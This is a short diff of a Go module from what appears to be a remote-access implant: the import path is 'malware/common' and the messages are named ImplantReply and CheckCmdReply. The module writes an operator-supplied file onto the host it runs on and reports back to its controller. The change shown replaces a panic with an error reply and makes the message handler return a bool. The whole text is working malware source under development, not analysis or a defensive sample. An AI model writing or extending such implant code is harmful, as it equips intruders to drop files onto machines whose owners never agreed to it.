@@ -2,7 +2,6 @@ package file_uploader
 
 import (
 	"io/ioutil"
-	"malware/common"
 	"malware/common/messages"
 	"malware/common/types"
 )
@@ -21,19 +20,20 @@ func Create() types.Module {
 	return settings{&state}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
 	file := message.GetUploadfile()
 	if file == nil {
-		return
+		return false
 	}
 
 	err := ioutil.WriteFile(file.Filename, file.Contents, 0644)
 
 	if err != nil {
-		common.Panicf(err, "Erroring loading file")
+		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_FILE_NOT_FOUND})
+	} else {
+		callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Written")})
 	}
-
-	callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Written")})
+	return true
 }
 
 // Init the state of this module
